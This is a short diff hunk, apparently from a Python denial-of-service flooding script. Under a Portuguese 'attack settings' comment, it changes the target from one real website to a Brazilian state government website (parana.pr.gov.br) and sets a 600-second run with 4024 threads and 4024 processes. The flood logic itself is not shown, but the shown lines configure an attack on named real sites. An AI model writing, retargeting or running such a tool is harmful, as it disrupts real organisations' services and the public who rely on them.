@@ -117,7 +117,7 @@ def flood(target_url, duration):
             print(f"An error occurred: {e}")
 
 # Configurações do ataque
-target_url = "https://agrcbt.pt/"
+target_url = "https://www.parana.pr.gov.br/"
 duration = 600
 num_threads = 4024
 num_processes = 4024
